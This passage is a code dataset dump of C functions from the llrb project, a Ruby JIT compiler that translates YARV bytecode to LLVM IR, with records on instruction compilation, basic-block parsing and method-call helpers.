(rb_num_t)operands[1];\n    //  if (flag & 0x02) { // for postarg\n    //  } else {\n    //  }\n    //  break;\n    //}\n    case YARVINSN_concatarray: {\n      LLVMValueRef ary2st = llrb_stack_pop(stack);\n      LLVMValueRef ary1   = llrb_stack_pop(stack);\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_concatarray\", 2, ary1, ary2st));\n      break;\n    }\n    case YARVINSN_splatarray: {\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_splatarray\", 2, llrb_stack_pop(stack), llrb_value(operands[0])));\n      break;\n    }\n    case YARVINSN_newhash: {\n      LLVMValueRef *values = ALLOC_N(LLVMValueRef, operands[0] / 2);\n      LLVMValueRef *keys   = ALLOC_N(LLVMValueRef, operands[0] / 2);\n      for (int i = 0; i < (int)operands[0] / 2; i++) {\n        values[i] = llrb_stack_pop(stack);\n        keys[i]   = llrb_stack_pop(stack);\n      }\n\n      LLVMValueRef result = LLVMBuildCall(c->builder, llrb_get_function(c->mod, \"rb_hash_new\"), 0, 0, \"newhash\");\n      // reverse set\n      for (int i = (int)operands[0] / 2 - 1; 0 <= i; i--) {\n        LLVMValueRef args[] = { result, keys[i], values[i] };\n        LLVMBuildCall(c->builder, llrb_get_function(c->mod, \"rb_hash_aset\"), args, 3, \"newhash_aset\");\n      }\n      llrb_stack_push(stack, result);\n      break;\n    }\n    case YARVINSN_newrange: {\n      LLVMValueRef high = llrb_stack_pop(stack);\n      LLVMValueRef low  = llrb_stack_pop(stack);\n      LLVMValueRef flag = LLVMConstInt(LLVMInt64Type(), operands[0], false);\n      llrb_stack_push(stack, llrb_call_func(c, \"rb_range_new\", 3, low, high, flag));\n      break;\n    }\n    case YARVINSN_pop:\n      llrb_stack_pop(stack);\n      break;\n    case YARVINSN_dup: {\n      LLVMValueRef value = llrb_stack_pop(stack);\n      llrb_stack_push(stack, value);\n      llrb_stack_push(stack, value);\n      break;\n    }\n    case YARVINSN_dupn: {\n      LLVMValueRef *values = ALLOC_N(LLVMValueRef, operands[0]); // `xfree`d in this block.\n      for (rb_num_t i = 0; i < (rb_num_t)operands[0]; i++) {\n        values[i] = llrb_stack_pop(stack); // TODO: obviously no need to pop\n      }\n\n      for (rb_num_t i = 0; i < (rb_num_t)operands[0]; i++) {\n        llrb_stack_push(stack, values[operands[0] - 1 - i]);\n      }\n      for (rb_num_t i = 0; i < (rb_num_t)operands[0]; i++) {\n        llrb_stack_push(stack, values[operands[0] - 1 - i]);\n      }\n      xfree(values);\n      break;\n    }\n    case YARVINSN_swap: {\n      LLVMValueRef first  = llrb_stack_pop(stack);\n      LLVMValueRef second = llrb_stack_pop(stack);\n      llrb_stack_push(stack, first);\n      llrb_stack_push(stack, second);\n      break;\n    }\n    //case YARVINSN_reverse: {\n    //  rb_num_t n = (rb_num_t)operands[0];\n    //  unsigned int last = stack->size - 1;\n    //  unsigned int top_i = last - n;\n\n    //  for (rb_num_t i = 0; i < n/2; i++) {\n    //    LLVMValueRef v0 = stack->body[top_i+i];\n    //    LLVMValueRef v1 = stack->body[last-i];\n    //    stack->body[top_i+i] = v1;\n    //    stack->body[last-i]  = v0;\n    //  }\n    //  break;\n    //}\n    //case YARVINSN_reput:\n    //  break; // none\n    case YARVINSN_topn: {\n      llrb_stack_push(stack, llrb_stack_topn(stack, (unsigned int)operands[0]));\n      break;\n    }\n    case YARVINSN_setn: {\n      rb_num_t last = (rb_num_t)stack->size - 1;\n      stack->body[last - (rb_num_t)operands[0]] = stack->body[last];\n      break;\n    }\n    case YARVINSN_adjuststack: {\n      for (rb_num_t i = 0; i < (rb_num_t)operands[0]; i++) {\n        llrb_stack_pop(stack);\n      }\n      break;\n    }\n    case YARVINSN_defined: {\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_defined\", 4, llrb_value(operands[0]),\n            llrb_value(operands[1]), llrb_value(operands[2]), llrb_stack_pop(stack)));\n      break;\n    }\n    case YARVINSN_checkmatch: {\n      LLVMValueRef pattern = llrb_stack_pop(stack);\n      LLVMValueRef target =llrb_stack_pop(stack);\n      LLVMValueRef flag = LLVMConstInt(LLVMInt64Type(), operands[0], false);\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_checkmatch\", 3, target, pattern, flag));\n      break;\n    }\n    case YARVINSN_checkkeyword: {\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_checkkeyword\", 3, llrb_get_cfp(c),\n            llrb_value((lindex_t)operands[0]), llrb_value((rb_num_t)operands[1])));\n      break;\n    }\n    case YARVINSN_trace: {\n      rb_event_flag_t flag = (rb_event_flag_t)((rb_num_t)operands[0]);\n      LLVMValueRef val = (flag & (RUBY_EVENT_RETURN | RUBY_EVENT_B_RETURN)) ? stack->body[stack->size-1] : llrb_value(Qundef);\n      llrb_call_func(c, \"llrb_insn_trace\", 4, llrb_get_thread(c), llrb_get_cfp(c), LLVMConstInt(LLVMInt32Type(), flag, false), val);\n      break;\n    }\n    //case YARVINSN_defineclass: {\n    //  ;\n    //  break;\n    //}\n    case YARVINSN_send: {\n      CALL_INFO ci = (CALL_INFO)operands[0];\n      unsigned int stack_size = ci->orig_argc + 1;\n      if (ci->flag & VM_CALL_ARGS_BLOCKARG) stack_size++; // push `&block`\n\n      unsigned int arg_size = 6 + stack_size;\n      LLVMValueRef *args = ALLOC_N(LLVMValueRef, arg_size);\n      args[0] = llrb_get_thread(c);\n      args[1] = llrb_get_cfp(c);\n      args[2] = llrb_value((VALUE)ci);\n      args[3] = llrb_value((VALUE)((CALL_CACHE)operands[1]));\n      args[4] = llrb_value((VALUE)((ISEQ)operands[2]));\n      args[5] = LLVMConstInt(LLVMInt32Type(), stack_size, false);\n      for (int i = (int)stack_size - 1; 0 <= i; i--) { // recv + argc\n        args[6 + i] = llrb_stack_pop(stack);\n      }\n\n      llrb_stack_push(stack, LLVMBuildCall(c->builder, llrb_get_function(c->mod, \"llrb_insn_send\"), args, arg_size, \"send\"));\n      break;\n    }\n    case YARVINSN_opt_str_freeze: { // TODO: optimize\n      llrb_stack_push(stack, llrb_value(operands[0]));\n      llrb_compile_opt_insn(c, stack, \"opt_str_freeze\", 1);\n      break;\n    }\n    case YARVINSN_opt_newarray_max: // TODO: optimize\n      llrb_stack_push(stack, llrb_compile_newarray(c, stack, (long)operands[0]));\n      llrb_stack_push(stack, llrb_compile_funcall(c, stack, rb_intern(\"max\"), 0));\n      break;\n    case YARVINSN_opt_newarray_min: // TODO: optimize\n      llrb_stack_push(stack, llrb_compile_newarray(c, stack, (long)operands[0]));\n      llrb_stack_push(stack, llrb_compile_funcall(c, stack, rb_intern(\"min\"), 0));\n      break;\n    case YARVINSN_opt_send_without_block: {\n      CALL_INFO ci = (CALL_INFO)operands[0];\n      LLVMValueRef recv = stack->body[stack->size - ci->orig_argc - 1];\n\n      llrb_compile_args(c, stack, ci->orig_argc);\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_opt_send_without_block\", 5,\n            llrb_get_thread(c),\n            llrb_get_cfp(c),\n            llrb_value((VALUE)ci),\n            llrb_value((VALUE)((CALL_CACHE)operands[1])),\n            recv));\n      break;\n    }\n    case YARVINSN_invokesuper: { // TODO: refactor with opt_send_without_block\n      CALL_INFO ci = (CALL_INFO)operands[0];\n      unsigned int stack_size = ci->orig_argc + 1;\n\n      LLVMValueRef *args = ALLOC_N(LLVMValueRef, 5 + stack_size);\n      args[0] = llrb_get_thread(c);\n      args[1] = llrb_get_cfp(c);\n      args[2] = llrb_value((VALUE)ci);\n      args[3] = llrb_value((VALUE)((CALL_CACHE)operands[1]));\n      args[4] = llrb_value((VALUE)((ISEQ)operands[2]));\n      args[5] = LLVMConstInt(LLVMInt32Type(), stack_size, false);\n      for (int i = (int)stack_size - 1; 0 <= i; i--) { // recv + argc\n        args[6 + i] = llrb_stack_pop(stack);\n      }\n      llrb_stack_push(stack, LLVMBuildCall(c->builder, llrb_get_function(c->mod, \"llrb_insn_invokesuper\"), args, 6 + stack_size, \"invokesuper\"));\n      break;\n    }\n    case YARVINSN_invokeblock: {\n      CALL_INFO ci = (CALL_INFO)operands[0];\n      unsigned int stack_size = ci->orig_argc;\n\n      LLVMValueRef *args = ALLOC_N(LLVMValueRef, 4 + stack_size);\n      args[0] = llrb_get_thread(c);\n      args[1] = llrb_get_cfp(c);\n      args[2] = llrb_value((VALUE)ci);\n      args[3] = LLVMConstInt(LLVMInt32Type(), stack_size, false);\n      for (int i = (int)stack_size - 1; 0 <= i; i--) { // recv + argc\n        args[4 + i] = llrb_stack_pop(stack);\n      }\n      llrb_stack_push(stack, LLVMBuildCall(c->builder, llrb_get_function(c->mod, \"llrb_insn_invokeblock\"), args, 4 + stack_size, \"invokeblock\"));\n      break;\n    }\n    case YARVINSN_leave:\n      if (stack->size != 1) {\n        llrb_dump_cfg(c->body, c->cfg);\n        rb_raise(rb_eCompileError, \"unexpected stack size at leave: %d\", stack->size);\n      }\n\n      llrb_call_func(c, \"llrb_push_result\", 2, llrb_get_cfp(c), llrb_stack_pop(stack));\n      LLVMBuildRet(c->builder, llrb_get_cfp(c));\n      return true;\n    case YARVINSN_throw: {\n      llrb_call_func(c, \"llrb_insn_throw\", 4, llrb_get_thread(c), llrb_get_cfp(c),\n          llrb_value((rb_num_t)operands[0]), llrb_stack_pop(stack));\n\n      // In opt_call_c_function, if we return 0, we can throw error fron th->errinfo.\n      // https://github.com/ruby/ruby/blob/v2_4_1/insns.def#L2147-L2151\n      LLVMBuildRet(c->builder, llrb_value(0));\n      return true;\n    }\n    case YARVINSN_jump: {\n      unsigned dest = pos + (unsigned)insn_len(insn) + operands[0];\n      struct llrb_basic_block *next_block = llrb_find_block(c->cfg, dest);\n\n      LLVMBuildBr(c->builder, next_block->ref);\n      *created_br = true;\n\n      if (next_block->incoming_size > 1 && stack->size > 0) {\n        llrb_push_incoming_things(c, next_block, LLVMGetInsertBlock(c->builder), llrb_stack_pop(stack));\n      }\n      llrb_compile_basic_block(c, next_block, stack);\n      return true;\n    }\n    case YARVINSN_branchif: { // TODO: refactor with other branch insns\n      unsigned branch_dest = pos + (unsigned)insn_len(insn) + operands[0];\n      unsigned fallthrough = pos + (unsigned)insn_len(insn);\n      struct llrb_basic_block *branch_dest_block = llrb_find_block(c->cfg, branch_dest);\n      struct llrb_basic_block *fallthrough_block = llrb_find_block(c->cfg, fallthrough);\n\n      LLVMValueRef cond = llrb_stack_pop(stack);\n      LLVMBuildCondBr(c->builder, llrb_build_rtest(c->builder, cond), branch_dest_block->ref, fallthrough_block->ref);\n      *created_br = true;\n\n      struct llrb_stack *branch_dest_stack = llrb_copy_stack(stack); // `llrb_destruct_stack`ed in this block.\n      if (branch_dest_block->incoming_size > 1 && branch_dest_stack->size > 0) {\n        llrb_push_incoming_things(c, branch_dest_block,\n            LLVMGetInsertBlock(c->builder), llrb_stack_pop(branch_dest_stack));\n      }\n      llrb_compile_basic_block(c, branch_dest_block, branch_dest_stack);\n      llrb_destruct_stack(branch_dest_stack);\n      break; // caller `compile_basic_block` compiles fallthrough_block and pushes incoming things to its phi node.\n    }\n    case YARVINSN_branchunless: { // TODO: refactor with other branch insns\n      unsigned branch_dest = pos + (unsigned)insn_len(insn) + operands[0];\n      unsigned fallthrough = pos + (unsigned)insn_len(insn);\n      struct llrb_basic_block *branch_dest_block = llrb_find_block(c->cfg, branch_dest);\n      struct llrb_basic_block *fallthrough_block = llrb_find_block(c->cfg, fallthrough);\n\n      LLVMValueRef cond = llrb_stack_pop(stack);\n      LLVMBuildCondBr(c->builder, llrb_build_rtest(c->builder, cond), fallthrough_block->ref, branch_dest_block->ref);\n      *created_br = true;\n\n      struct llrb_stack *branch_dest_stack = llrb_copy_stack(stack); // `llrb_destruct_stack`ed in this block.\n      if (branch_dest_block->incoming_size > 1 && branch_dest_stack->size > 0) {\n        llrb_push_incoming_things(c, branch_dest_block,\n            LLVMGetInsertBlock(c->builder), llrb_stack_pop(branch_dest_stack));\n      }\n      llrb_compile_basic_block(c, branch_dest_block, branch_dest_stack);\n      llrb_destruct_stack(branch_dest_stack);\n      break; // caller `compile_basic_block` compiles fallthrough_block and pushes incoming things to its phi node.\n    }\n    case YARVINSN_branchnil: { // TODO: refactor with other branch insns\n      unsigned branch_dest = pos + (unsigned)insn_len(insn) + operands[0];\n      unsigned fallthrough = pos + (unsigned)insn_len(insn);\n      struct llrb_basic_block *branch_dest_block = llrb_find_block(c->cfg, branch_dest);\n      struct llrb_basic_block *fallthrough_block = llrb_find_block(c->cfg, fallthrough);\n\n      LLVMValueRef cond = llrb_stack_pop(stack);\n      LLVMBuildCondBr(c->builder,\n          LLVMBuildICmp(c->builder, LLVMIntNE, cond, llrb_value(Qnil), \"NIL_P\"),\n          fallthrough_block->ref, branch_dest_block->ref);\n      *created_br = true;\n\n      struct llrb_stack *branch_dest_stack = llrb_copy_stack(stack); // `llrb_destruct_stack`ed in this block.\n      if (branch_dest_block->incoming_size > 1 && branch_dest_stack->size > 0) {\n        llrb_push_incoming_things(c, branch_dest_block,\n            LLVMGetInsertBlock(c->builder), llrb_stack_pop(branch_dest_stack));\n      }\n      llrb_compile_basic_block(c, branch_dest_block, branch_dest_stack);\n      llrb_destruct_stack(branch_dest_stack);\n      break; // caller `compile_basic_block` compiles fallthrough_block and pushes incoming things to its phi node.\n    }\n    case YARVINSN_getinlinecache:\n      llrb_stack_push(stack, llrb_value(Qnil)); // TODO: implement\n      break;\n    case YARVINSN_setinlinecache:\n      break; // TODO: implement\n    //case YARVINSN_once:\n    case YARVINSN_opt_case_dispatch: // Use `switch` instruction\n      llrb_stack_pop(stack); // TODO: implement\n      break;\n    case YARVINSN_opt_plus:\n      llrb_compile_opt_insn(c, stack, \"opt_plus\", 2);\n      break;\n    case YARVINSN_opt_minus:\n      llrb_compile_opt_insn(c, stack, \"opt_minus\", 2);\n      break;\n    case YARVINSN_opt_mult:\n      llrb_compile_opt_insn(c, stack, \"opt_mult\", 2);\n      break;\n    case YARVINSN_opt_div:\n      llrb_compile_opt_insn(c, stack, \"opt_div\", 2);\n      break;\n    case YARVINSN_opt_mod:\n      llrb_compile_opt_insn(c, stack, \"opt_mod\", 2);\n      break;\n    case YARVINSN_opt_eq:\n      llrb_compile_opt_insn(c, stack, \"opt_eq\", 2);\n      break;\n    case YARVINSN_opt_neq: {\n      LLVMValueRef *args = ALLOC_N(LLVMValueRef, 6); // `xfree`d in this block.\n      args[1] = llrb_stack_pop(stack);\n      args[0] = llrb_stack_pop(stack);\n      args[2] = llrb_value(operands[0]);\n      args[3] = llrb_value(operands[1]);\n      args[4] = llrb_value(operands[2]);\n      args[5] = llrb_value(operands[3]);\n      llrb_stack_push(stack, LLVMBuildCall(c->builder, llrb_get_function(c->mod, \"llrb_insn_opt_neq\"), args, 6, \"\"));\n      xfree(args);\n      break;\n    }\n    case YARVINSN_opt_lt:\n      llrb_compile_opt_insn(c, stack, \"opt_lt\", 2);\n      break;\n    case YARVINSN_opt_le:\n      llrb_compile_opt_insn(c, stack, \"opt_le\", 2);\n      break;\n    case YARVINSN_opt_gt:\n      llrb_compile_opt_insn(c, stack, \"opt_gt\", 2);\n      break;\n    case YARVINSN_opt_ge:\n      llrb_compile_opt_insn(c, stack, \"opt_ge\", 2);\n      break;\n    case YARVINSN_opt_ltlt:\n      llrb_compile_opt_insn(c, stack, \"opt_ltlt\", 2);\n      break;\n    case YARVINSN_opt_aref:\n      llrb_compile_opt_insn(c, stack, \"opt_aref\", 2);\n      break;\n    case YARVINSN_opt_aset:\n      llrb_compile_opt_insn(c, stack, \"opt_aset\", 3);\n      break;\n    case YARVINSN_opt_aset_with: {\n      LLVMValueRef value = llrb_stack_pop(stack);\n      LLVMValueRef recv  = llrb_stack_pop(stack);\n      LLVMValueRef str   = llrb_call_func(c, \"rb_str_resurrect\", 1, llrb_value(operands[2]));\n\n      // Not using llrb_compile_funcall to prevent stack overflow\n      llrb_stack_push(stack, llrb_call_func(c, \"rb_funcall\", 5, recv,\n            llrb_value(rb_intern(\"[]=\")), LLVMConstInt(LLVMInt32Type(), 2, true), str, value));\n      break;\n    }\n    case YARVINSN_opt_aref_with: {\n      LLVMValueRef str = llrb_call_func(c, \"rb_str_resurrect\", 1, llrb_value(operands[2]));\n\n      // Not using llrb_compile_funcall to prevent stack overflow\n      llrb_stack_push(stack, llrb_call_func(c, \"rb_funcall\", 4, llrb_stack_pop(stack),\n            llrb_value(rb_intern(\"[]\")), LLVMConstInt(LLVMInt32Type(), 1, true), str));\n      break;\n    }\n    case YARVINSN_opt_length:\n      llrb_stack_push(stack, llrb_compile_funcall(c, stack, rb_intern(\"length\"), 0));\n      break;\n    case YARVINSN_opt_size:\n      llrb_stack_push(stack, llrb_compile_funcall(c, stack, rb_intern(\"size\"), 0));\n      break;\n    case YARVINSN_opt_empty_p:\n      llrb_stack_push(stack, llrb_compile_funcall(c, stack, rb_intern(\"empty?\"), 0));\n      break;\n    case YARVINSN_opt_succ:\n      llrb_stack_push(stack, llrb_compile_funcall(c, stack, rb_intern(\"succ\"), 0));\n      break;\n    case YARVINSN_opt_not:\n      llrb_stack_push(stack, llrb_compile_funcall(c, stack, '!', 0));\n      break;\n    case YARVINSN_opt_regexpmatch1: {\n      // Not using llrb_compile_funcall to prevent stack overflow\n      llrb_stack_push(stack, llrb_call_func(c, \"rb_funcall\", 4, llrb_stack_pop(stack),\n            llrb_value(rb_intern(\"=~\")), LLVMConstInt(LLVMInt32Type(), 1, true), llrb_value(operands[0])));\n      break;\n    }\n    case YARVINSN_opt_regexpmatch2: {\n      llrb_stack_push(stack, llrb_compile_funcall(c, stack, rb_intern(\"=~\"), 1));\n      break;\n    }\n    //case YARVINSN_opt_call_c_function:\n    case YARVINSN_getlocal_OP__WC__0: {\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_getlocal_level0\", 2, llrb_get_cfp(c), llrb_value((lindex_t)operands[0])));\n      break;\n    }\n    case YARVINSN_getlocal_OP__WC__1: {\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_getlocal_level1\", 2, llrb_get_cfp(c), llrb_value((lindex_t)operands[0])));\n      break;\n    }\n    case YARVINSN_setlocal_OP__WC__0: {\n      LLVMValueRef idx = llrb_value((lindex_t)operands[0]);\n      llrb_call_func(c, \"llrb_insn_setlocal_level0\", 3, llrb_get_cfp(c), idx, llrb_stack_pop(stack));\n      break;\n    }\n    case YARVINSN_setlocal_OP__WC__1: {\n      LLVMValueRef idx = llrb_value((lindex_t)operands[0]);\n      llrb_call_func(c, \"llrb_insn_setlocal_level1\", 3, llrb_get_cfp(c), idx, llrb_stack_pop(stack));\n      break;\n    }\n    case YARVINSN_putobject_OP_INT2FIX_O_0_C_:\n      llrb_stack_push(stack, llrb_value(INT2FIX(0)));\n      break;\n    case YARVINSN_putobject_OP_INT2FIX_O_1_C_:\n      llrb_stack_push(stack, llrb_value(INT2FIX(1)));\n      break;\n    default:\n      llrb_dump_cfg(c->body, c->cfg);\n      rb_raise(rb_eCompileError, \"Unhandled insn at llrb_compile_insn: %s\", insn_name(insn));\n      break;\n  }\n  //fprintf(stderr, \"  [DEBUG] llrb_compile_insn: %04d after %-27s (stack size: %d)\\n\", pos, insn_name(insn), stack->size);\n  return false;\n}", "path": "ext\\llrb\\compiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// Return sorted unique Ruby array of Basic Block start positions. Example: [0, 2, 8].\n//\n// It's constructed in the following rule.\n//   Rule 1: 0 is always included\n//   Rule 2: TS_OFFSET numers for are branch and jump instructions are included\n//   Rule 3: Positions immediately after jump instructions (jump, branchnil, branchif, branchunless, opt_case_dispatch, leave) are included\n", "func_signal": "static VALUE\nllrb_basic_block_starts(const struct rb_iseq_constant_body *body)", "code": "{\n  // TODO: No need to check leave? leave is always in the end?\n\n  // Rule 1\n  VALUE starts = rb_ary_new_capa(1); // Maybe GCed. Freeing this causes Bus Error...\n  rb_ary_push(starts, INT2FIX(0));\n\n  for (unsigned int i = 0; i < body->iseq_size;) {\n    int insn = rb_vm_insn_addr2insn((void *)body->iseq_encoded[i]);\n\n    // Rule 2\n    switch (insn) {\n      case YARVINSN_branchif:\n      case YARVINSN_branchunless:\n      case YARVINSN_branchnil:\n      case YARVINSN_jump: {\n        VALUE op = body->iseq_encoded[i+1];\n        rb_ary_push(starts, INT2FIX(i+insn_len(insn)+op));\n        break;\n      }\n      //case YARVINSN_opt_case_dispatch:\n    }\n\n    // Rule 3\n    switch (insn) {\n      case YARVINSN_branchif:\n      case YARVINSN_branchunless:\n      case YARVINSN_branchnil:\n      case YARVINSN_jump:\n      case YARVINSN_throw:\n        if (i+insn_len(insn) < body->iseq_size) {\n          rb_ary_push(starts, INT2FIX(i+insn_len(insn)));\n        }\n        break;\n      //case YARVINSN_opt_case_dispatch:\n    }\n\n    i += insn_len(insn);\n  }\n  starts = rb_ary_sort_bang(starts);\n  rb_funcall(starts, rb_intern(\"uniq!\"), 0);\n  return starts;\n}", "path": "ext\\llrb\\parser.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// TODO: refactor with invokesuper\n", "func_signal": "llrb_insn_opt_send_without_block(VALUE th_v, VALUE cfp_v, VALUE ci_v, VALUE cc_v, VALUE recv)", "code": "{\n  rb_thread_t *th = (rb_thread_t *)th_v;\n  rb_control_frame_t *cfp = (rb_control_frame_t *)cfp_v;\n  CALL_INFO ci = (CALL_INFO)ci_v;\n  CALL_CACHE cc = (CALL_CACHE)cc_v;\n\n  vm_search_method(ci, cc, recv);\n\n  struct rb_calling_info calling;\n  calling.block_handler = VM_BLOCK_HANDLER_NONE;\n  calling.argc = ci->orig_argc;\n  calling.recv = recv;\n\n  VALUE result = CALL_METHOD(&calling, ci, cc);\n  if (result == Qundef) {\n    VM_ENV_FLAGS_SET(th->cfp->ep, VM_FRAME_FLAG_FINISH);\n    return vm_exec(th);\n  }\n  return result;\n}", "path": "ext\\llrb_insn_opt_send_without_block.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// If insn can call any method, it is throwable and needs to change program counter. Or it may rb_raise.\n", "func_signal": "static bool\nllrb_pc_change_required(const int insn)", "code": "{\n  switch (insn) {\n    case YARVINSN_tostring:\n    case YARVINSN_freezestring:\n    case YARVINSN_checkmatch:\n    case YARVINSN_send:\n    case YARVINSN_opt_str_freeze:\n    case YARVINSN_opt_newarray_max:\n    case YARVINSN_opt_newarray_min:\n    case YARVINSN_opt_send_without_block:\n    case YARVINSN_invokesuper:\n    case YARVINSN_invokeblock:\n    case YARVINSN_leave:\n    case YARVINSN_throw:\n    case YARVINSN_opt_plus:\n    case YARVINSN_opt_minus:\n    case YARVINSN_opt_mult:\n    case YARVINSN_opt_div:\n    case YARVINSN_opt_mod:\n    case YARVINSN_opt_eq:\n    case YARVINSN_opt_neq:\n    case YARVINSN_opt_lt:\n    case YARVINSN_opt_le:\n    case YARVINSN_opt_gt:\n    case YARVINSN_opt_ge:\n    case YARVINSN_opt_ltlt:\n    case YARVINSN_opt_aref:\n    case YARVINSN_opt_aset:\n    case YARVINSN_opt_aset_with:\n    case YARVINSN_opt_aref_with:\n    case YARVINSN_opt_length:\n    case YARVINSN_opt_size:\n    case YARVINSN_opt_empty_p:\n    case YARVINSN_opt_succ:\n    case YARVINSN_opt_not:\n    case YARVINSN_opt_regexpmatch1:\n    case YARVINSN_opt_regexpmatch2:\n    case YARVINSN_opt_call_c_function:\n      return true;\n    default:\n      return false;\n  }\n}", "path": "ext\\llrb\\compiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// In base 2, RTEST is: (v != Qfalse && v != Qnil) -> (v != 0000 && v != 1000) -> (v & 0111) != 0000 -> (v & ~Qnil) != 0\n", "func_signal": "static LLVMValueRef\nllrb_build_rtest(LLVMBuilderRef builder, LLVMValueRef value)", "code": "{\n  LLVMValueRef masked = LLVMBuildAnd(builder, value, llrb_value(~Qnil), \"RTEST_mask\");\n  return LLVMBuildICmp(builder, LLVMIntNE, masked, llrb_value(0), \"RTEST\");\n}", "path": "ext\\llrb\\compiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// LLRB::JIT.preview_iseq\n// @param  [Array]   iseqw - RubyVM::InstructionSequence instance\n// @return [Boolean] return true if compiled\n", "func_signal": "static VALUE\nrb_jit_preview_iseq(RB_UNUSED_VAR(VALUE self), VALUE iseqw)", "code": "{\n  const rb_iseq_t *iseq = rb_iseqw_to_iseq(iseqw);\n  if (llrb_should_not_compile(iseq)) return Qfalse;\n\n  LLVMModuleRef mod = llrb_compile_iseq(iseq->body, iseq->body->iseq_encoded, llrb_funcname, false);\n  LLVMDumpModule(mod);\n  LLVMDisposeModule(mod);\n  return Qtrue;\n}", "path": "ext\\llrb\\llrb.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// TODO: Use vm_dtrace after Ruby 2.5\n", "func_signal": "static inline void\n_llrb_insn_trace(rb_thread_t *th, rb_control_frame_t *cfp, rb_event_flag_t flag, VALUE val)", "code": "{\n  if (RUBY_DTRACE_METHOD_ENTRY_ENABLED() ||\n      RUBY_DTRACE_METHOD_RETURN_ENABLED() ||\n      RUBY_DTRACE_CMETHOD_ENTRY_ENABLED() ||\n      RUBY_DTRACE_CMETHOD_RETURN_ENABLED()) {\n\n    switch (flag) {\n      case RUBY_EVENT_CALL:\n        RUBY_DTRACE_METHOD_ENTRY_HOOK(th, 0, 0);\n        break;\n      case RUBY_EVENT_C_CALL:\n        RUBY_DTRACE_CMETHOD_ENTRY_HOOK(th, 0, 0);\n        break;\n      case RUBY_EVENT_RETURN:\n        RUBY_DTRACE_METHOD_RETURN_HOOK(th, 0, 0);\n        break;\n      case RUBY_EVENT_C_RETURN:\n        RUBY_DTRACE_CMETHOD_RETURN_HOOK(th, 0, 0);\n        break;\n    }\n  }\n\n  // TODO: Confirm it works!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n  // Especially for :line event. We may need to update program counter.\n  EXEC_EVENT_HOOK(th, flag, cfp->self, 0, 0, 0 /* id and klass are resolved at callee */, val);\n}", "path": "ext\\llrb_insn_trace.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// Catch table checks program counter to decide catch it or not. So we need to set program counter before method call or throw insn.\n", "func_signal": "static void\nllrb_increment_pc(const struct llrb_compiler *c, const unsigned int pos, const int insn)", "code": "{\n  if (pos == 0) return; // Skip. 0 would be opt_call_c_function and there's no need to change.\n\n  if (llrb_pc_change_required(insn)) {\n    // This case should be rejected to compile by `llrb_check_not_compilable`.\n    if (pos == 1) rb_raise(rb_eCompileError, \"program counter is set to 1 from iseq_encoded\");\n\n    // `pos` MUST NOT be 0 (it causes stack level too deep) or 1 (funcptr is considered as insn and it's invalid as insn).\n    const VALUE *pc = c->new_iseq_encoded + pos; // This must be `new_iseq_encoded` to get proper `epc` in `vm_exec`.\n    llrb_call_func(c, \"llrb_set_pc\", 2, llrb_get_cfp(c), llrb_value((VALUE)pc));\n  }\n}", "path": "ext\\llrb\\compiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// llrb_create_native_func() uses a LLVM function named as `funcname` defined in returned LLVM module.\n", "func_signal": "LLVMModuleRef\nllrb_compile_iseq(const struct rb_iseq_constant_body *body, const VALUE *new_iseq_encoded, const char* funcname, bool enable_stats)", "code": "{\n  extern void llrb_parse_iseq(const struct rb_iseq_constant_body *body, struct llrb_cfg *result);\n  struct llrb_cfg cfg;\n  llrb_parse_iseq(body, &cfg);\n\n  LLVMModuleRef mod = LLVMModuleCreateWithName(\"llrb\");\n  LLVMValueRef func = llrb_compile_cfg(mod, body, new_iseq_encoded, &cfg, funcname);\n\n  extern void llrb_optimize_function(LLVMModuleRef cmod, LLVMValueRef cfunc, bool enable_stats);\n  if (1) llrb_optimize_function(mod, func, enable_stats);\n\n  if (0) llrb_dump_cfg(body, &cfg);\n  if (0) LLVMDumpModule(mod);\n\n  llrb_destruct_cfg(&cfg);\n  return mod;\n}", "path": "ext\\llrb\\compiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// LLRB::JIT.compile_iseq\n// @param  [Array]   iseqw - RubyVM::InstructionSequence instance\n// @param  [Boolean] enable_stats - Enable LLVM Pass statistics\n// @return [Boolean] return true if compiled\n", "func_signal": "static VALUE\nrb_jit_compile_iseq(RB_UNUSED_VAR(VALUE self), VALUE iseqw, VALUE enable_stats)", "code": "{\n  const rb_iseq_t *iseq = rb_iseqw_to_iseq(iseqw);\n  return llrb_compile_iseq_to_method(iseq, RTEST(enable_stats));\n}", "path": "ext\\llrb\\llrb.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
